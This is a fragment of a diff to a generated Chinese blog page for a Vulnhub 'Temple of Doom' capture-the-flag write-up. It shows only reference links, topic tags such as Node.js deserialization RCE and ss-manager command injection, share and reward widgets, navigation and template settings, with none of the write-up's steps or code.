+<li><a href="https://www.hackingarticles.in/hack-the-temple-of-doom-ctf-challenge/" target="_blank" rel="noopener">hackingarticles</a></li>
+<li><a href="https://www.exploit-db.com/exploits/43006" target="_blank" rel="noopener">Exploit-db</a></li>
+<li><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></li>
+</ol>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">wordpress爆破</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">node rce</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">ssh爆破</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">序列化与反序列化</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">udf提权</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">tcpdump提权</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sudoers配置错误</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">ss-manager命令注入</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -230,17 +305,104 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/12/13/VUlnhub-Challenging-Temple-of-doom-1/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2018/12/11/Vulnhub-Challenging-jarbas/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Vulnhub Challenging: jarbas</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -263,9 +425,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
